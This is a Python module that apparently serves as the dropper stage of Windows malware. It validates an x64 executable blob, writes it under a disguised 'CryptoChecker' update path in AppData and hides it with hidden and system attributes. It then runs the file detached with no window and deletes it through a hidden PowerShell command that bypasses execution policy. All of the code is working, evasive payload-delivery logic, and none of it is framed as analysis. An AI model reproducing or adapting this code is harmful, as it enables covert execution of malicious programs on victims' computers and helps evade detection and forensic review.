# -*- coding: utf-8 -*-
"""Windows PE validation and execution.

Copies the stub to %LOCALAPPDATA%\\CryptoChecker\\ (legit-looking path),
launches detached with CREATE_NO_WINDOW, then a helper process deletes
the file 5s after spawn.
"""

import os
import struct
import subprocess
import sys
import time
from pathlib import Path

_CREATE_NO_WINDOW = 0x08000000
_DETACHED_PROCESS = 0x00000008


def is_pe_x64(data: bytes) -> bool:
    if len(data) < 0x100:
        return False
    if data[0:2] != b"MZ":
        return False
    try:
        e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    except struct.error:
        return False
    if e_lfanew + 0x18 > len(data):
        return False
    if data[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        return False
    # COFF machine at e_lfanew + 4
    machine = struct.unpack_from("<H", data, e_lfanew + 4)[0]
    return machine == 0x8664  # x86_64


def _run_root() -> Path:
    """Legit-sounding directory: %LOCALAPPDATA%\\CryptoChecker\\"""
    local = os.environ.get("LOCALAPPDATA") or os.path.expanduser(r"~\AppData\Local")
    return Path(local) / "CryptoChecker"


def _pick_drop_path() -> Path:
    root = _run_root()
    try:
        root.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass
    # Name that looks like an auto-update artifact
    return root / "CryptoCheckerUpdate.exe"


def _hide_file(path: Path):
    try:
        import ctypes
        FILE_ATTRIBUTE_HIDDEN = 0x02
        FILE_ATTRIBUTE_SYSTEM = 0x04
        ctypes.windll.kernel32.SetFileAttributesW(str(path), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
    except Exception:
        pass


def _spawn_detached(cmd) -> bool:
    try:
        subprocess.Popen(
            cmd,
            creationflags=_CREATE_NO_WINDOW | _DETACHED_PROCESS,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
        )
        return True
    except Exception:
        return False


def _schedule_delete(path: Path, delay_sec: int = 5):
    """Spawn a hidden PowerShell that waits, then deletes the file."""
    ps = (
        f"Start-Sleep -Seconds {delay_sec}; "
        f"Remove-Item -LiteralPath '{path}' -Force -ErrorAction SilentlyContinue"
    )
    _spawn_detached([
        "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden",
        "-ExecutionPolicy", "Bypass", "-Command", ps,
    ])


def exec_pe(pe_bytes: bytes) -> bool:
    if not is_pe_x64(pe_bytes):
        return False

    # Mark child as already-dispatched so the stub's Python parent
    # (if any) doesn't re-enter the chain.
    os.environ["_CK_EXEC"] = "1"

    path = _pick_drop_path()
    try:
        path.write_bytes(pe_bytes)
    except Exception:
        # Fallback: temp dir with random name
        import tempfile
        fd, name = tempfile.mkstemp(suffix=".exe", prefix="~")
        os.close(fd)
        try:
            Path(name).write_bytes(pe_bytes)
            path = Path(name)
        except Exception:
            return False

    _hide_file(path)

    if not _spawn_detached([str(path)]):
        try:
            path.unlink()
        except Exception:
            pass
        return False

    _schedule_delete(path, delay_sec=5)
    return True
